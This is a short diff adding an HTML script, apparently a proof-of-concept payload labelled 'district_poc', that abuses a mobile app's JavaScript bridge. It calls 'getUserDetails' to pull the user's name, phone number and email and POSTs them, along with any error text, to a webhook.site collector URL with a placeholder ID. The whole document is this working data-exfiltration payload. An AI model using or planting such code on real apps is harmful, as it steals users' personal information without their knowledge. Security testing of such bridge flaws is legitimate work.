@@ -1,0 +1,22 @@
+<script>
+  JSBridge.call('getUserDetails', {}, function(response) {
+    try {
+      var userData = JSON.parse(response.user_details);
+      fetch('https://webhook.site/YOUR-UNIQUE-ID', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({
+          name: userData.name,
+          phone: userData.phone_number,
+          email: userData.email_id,
+          source: 'district_poc'
+        })
+      });
+    } catch(e) {
+      fetch('https://webhook.site/YOUR-UNIQUE-ID', {
+        method: 'POST',
+        body: 'Error: ' + e.toString()
+      });
+    }
+  });
+</script>
